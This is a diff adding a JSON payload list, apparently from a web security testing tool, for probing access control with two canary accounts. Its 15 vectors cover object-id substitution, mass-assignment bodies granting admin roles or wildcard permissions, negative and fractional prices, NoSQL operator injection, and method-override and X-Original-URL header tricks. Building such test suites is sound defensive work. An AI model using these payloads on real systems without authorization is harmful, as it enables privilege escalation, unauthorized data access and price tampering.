@@ -1,0 +1,82 @@
+{
+  "class": "access_control",
+  "order": "bypass-first",
+  "note": "Layer 12 tamper ladder (skills/param_tampering.md). requires: two canary accounts via atap; {PEER_ID} = canary B identifier; {BASELINE_VALUE} = untouched value. One variable per probe; every probe diffed with res_diff.",
+  "payloads": [
+    {
+      "id": "access::01",
+      "vector": "{PEER_ID}",
+      "note": "identity substitution — canary B's object id in A's session"
+    },
+    {
+      "id": "access::02",
+      "vector": "1",
+      "note": "low sequential id"
+    },
+    {
+      "id": "access::03",
+      "vector": "0",
+      "note": "zero id"
+    },
+    {
+      "id": "access::04",
+      "vector": "-1",
+      "note": "negative id"
+    },
+    {
+      "id": "access::05",
+      "vector": "{\"role\":\"admin\"}",
+      "note": "mass assignment: role=admin"
+    },
+    {
+      "id": "access::06",
+      "vector": "{\"is_admin\":true}",
+      "note": "mass assignment: is_admin"
+    },
+    {
+      "id": "access::07",
+      "vector": "{\"permissions\":[\"*\"]}",
+      "note": "mass assignment: wildcard permissions"
+    },
+    {
+      "id": "access::08",
+      "vector": "{\"verified\":true}",
+      "note": "state flip: verified"
+    },
+    {
+      "id": "access::09",
+      "vector": "-1",
+      "note": "value class: negative price/amount"
+    },
+    {
+      "id": "access::10",
+      "vector": "0.0000001",
+      "note": "value class: sub-unit price"
+    },
+    {
+      "id": "access::11",
+      "vector": "[{BASELINE_VALUE}]",
+      "note": "type confusion: scalar→list"
+    },
+    {
+      "id": "access::12",
+      "vector": "{\"$ne\":null}",
+      "note": "type confusion: operator injection"
+    },
+    {
+      "id": "access::13",
+      "vector": "true",
+      "note": "hidden/debug param enable"
+    },
+    {
+      "id": "access::14",
+      "vector": "X-HTTP-Method-Override: DELETE",
+      "note": "method override on POST endpoint"
+    },
+    {
+      "id": "access::15",
+      "vector": "X-Original-URL: /admin",
+      "note": "path confusion header"
+    }
+  ]
+}
